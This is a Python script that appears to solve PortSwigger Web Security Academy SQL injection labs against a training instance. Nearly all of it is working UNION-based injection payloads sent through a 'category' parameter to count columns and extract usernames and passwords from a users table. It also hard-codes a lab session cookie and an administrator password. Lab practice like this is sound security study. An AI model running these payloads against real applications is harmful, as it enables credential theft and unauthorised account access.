# https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
# https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
# https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
# https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column

import requests
requests.packages.urllib3.disable_warnings()

base = "https://ac031fd11e7cb684806d0680004200ce.web-security-academy.net"
path = "/filter"
url = base + path
proxy = "127.0.0.1:8080"
proxies = {"https://": proxy, "http://": proxy}
cookies = {"session": "vZqbE7J91aHMd4AC65hs2w5nrIl48BUR"}
verify = False

def determineNumberOfColumnsLab():
    def usingOrderBy():
        for i in range(1, 11):
            yield f"' ORDER BY {i}-- "

    def usingNull():
        cols = "NULL"
        for _ in range(1, 11):
            yield f"' UNION SELECT {cols}-- "
            cols += ", NULL"

    hs = set()
    rs = {}
    # for q in usingOrderBy():
    for q in usingNull():
        params = {"category": q}
        r = requests.get(url, params=params, cookies=cookies, verify=verify, proxies=proxies)
        h = hash(r.text)
        if h not in hs:
            hs.add(h)
            rs[q] = r

    for k,_ in rs.items():
        print(k)

def findColumnContainingTextLab():
    cols = ["'btHbdU', NULL, NULL",
            "NULL, 'btHbdU', NULL",
            "NULL, NULL, 'btHbdU'"]

    for c in cols:
        q = f"' UNION SELECT {c}-- "
        params = {"category": q}
        requests.get(url, params=params, cookies=cookies, verify=verify, proxies=proxies)

def loginWithPassword():
        username = "administrator"
        password = "stdnya4z3y5ehb4j4atv"

        q = f"' UNION SELECT {username}, {password} FROM users-- "
        data = {"csrf": "Need a valid CSRF token here", "username": username, "password": password}
        url = base + "/login"
        requests.post(url, data=data, cookies=cookies, verify=verify, proxies=proxies)

def retrieveDataFromOtherTables():
    def getPassword():
        username = "username"
        password = "password"

        q = f"' UNION SELECT {username}, {password} FROM users-- "
        params = {"category": q}
        requests.get(url, params=params, cookies=cookies, verify=verify, proxies=proxies)

    getPassword()
    # loginWithPassword()

def retrieveMultipleValuesInSingleColumn():
    def getPassword():
        q = "' UNION SELECT NULL, username || '~' || password FROM users-- "
        params = {"category": q}
        requests.get(url, verify=verify, params=params, cookies=cookies, proxies=proxies)

    getPassword()
    # loginWithPassword()


determineNumberOfColumnsLab()
# findColumnContainingTextLab()
# retrieveDataFromOtherTables()
# retrieveMultipleValuesInSingleColumn()
